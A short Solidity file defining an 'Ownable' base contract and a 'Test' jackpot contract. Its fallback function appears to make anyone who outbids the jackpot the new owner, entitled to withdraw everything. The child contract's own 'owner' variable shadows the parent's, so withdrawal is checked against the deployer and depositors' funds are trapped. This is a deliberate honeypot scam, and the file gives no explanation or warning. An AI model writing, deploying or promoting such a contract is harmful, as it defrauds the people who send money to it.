contract Ownable {
  address owner = msg.sender;
  modifier onlyOwner {
    require(msg.sender == owner);
    _;
  }
}
contract Test is Ownable {
  address public owner;
  uint256 public jackpot;

  function() public payable {
    if(msg.value>jackpot)owner=msg.sender;
    jackpot += msg.value;
  }
  function takeAll() public onlyOwner {
    msg.sender.transfer(this.balance);
    jackpot = 0;
  }
}